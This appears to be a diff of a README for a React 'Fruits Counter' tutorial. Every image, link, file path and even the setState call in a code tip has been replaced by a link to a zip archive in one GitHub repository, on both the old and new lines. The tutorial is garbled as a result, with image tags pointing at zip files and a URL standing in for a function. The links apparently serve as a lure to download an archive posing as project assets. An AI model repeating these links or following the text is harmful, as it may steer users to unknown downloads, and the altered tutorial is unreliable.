@@ -4,7 +4,7 @@ In this project, let's build a **Fruits Counter** by applying the concepts we ha
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip" alt="fruits-counter" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://github.com/vicky9696v/react-counter/raw/refs/heads/main/src/components/FruitsCounter/react-counter-3.7.zip" alt="fruits-counter" style="max-width:70%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -13,8 +13,8 @@ In this project, let's build a **Fruits Counter** by applying the concepts we ha
 <details>
 <summary>Click to view</summary>
 
-- [Extra Small (Size < 576px) and Small (Size >= 576px)](https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip)
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip)
+- [Extra Small (Size < 576px) and Small (Size >= 576px)](https://github.com/vicky9696v/react-counter/raw/refs/heads/main/src/components/FruitsCounter/react-counter-3.7.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://github.com/vicky9696v/react-counter/raw/refs/heads/main/src/components/FruitsCounter/react-counter-3.7.zip)
 
 </details>
 
@@ -47,8 +47,8 @@ The app must have the following functionalities
 
 Use these files to complete the implementation:
 
-- `https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip`
-- `https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip`
+- `https://github.com/vicky9696v/react-counter/raw/refs/heads/main/src/components/FruitsCounter/react-counter-3.7.zip`
+- `https://github.com/vicky9696v/react-counter/raw/refs/heads/main/src/components/FruitsCounter/react-counter-3.7.zip`
 </details>
 
 ### Quick Tips
@@ -65,10 +65,10 @@ Use these files to complete the implementation:
   state = { key1 : value1, key2 : value2 }
   ```
 
-  If you use https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip such as :
+  If you use https://github.com/vicky9696v/react-counter/raw/refs/heads/main/src/components/FruitsCounter/react-counter-3.7.zip such as :
 
   ```
-  https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip(prevState => ({key1: prevState + valueN}))
+  https://github.com/vicky9696v/react-counter/raw/refs/heads/main/src/components/FruitsCounter/react-counter-3.7.zip(prevState => ({key1: prevState + valueN}))
   ```
 
   Your new state will be :
@@ -84,7 +84,7 @@ Use these files to complete the implementation:
   ```
 
   <br/>
-   <img src="https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip" alt="cursor pointer" style="width:100px" />
+   <img src="https://github.com/vicky9696v/react-counter/raw/refs/heads/main/src/components/FruitsCounter/react-counter-3.7.zip" alt="cursor pointer" style="width:100px" />
 
 - You can use the below outline CSS property for buttons and input elements to remove the highlighting when the elements are clicked,
 
@@ -99,8 +99,8 @@ Use these files to complete the implementation:
 <details>
 <summary>Image URLs</summary>
 
-- [https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip](https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip) alt should be **mango**
-- [https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip](https://raw.githubusercontent.com/vicky9696v/react-counter/main/impertinent/react-counter.zip) alt should be **banana**
+- [https://github.com/vicky9696v/react-counter/raw/refs/heads/main/src/components/FruitsCounter/react-counter-3.7.zip](https://github.com/vicky9696v/react-counter/raw/refs/heads/main/src/components/FruitsCounter/react-counter-3.7.zip) alt should be **mango**
+- [https://github.com/vicky9696v/react-counter/raw/refs/heads/main/src/components/FruitsCounter/react-counter-3.7.zip](https://github.com/vicky9696v/react-counter/raw/refs/heads/main/src/components/FruitsCounter/react-counter-3.7.zip) alt should be **banana**
 
 </details>
 
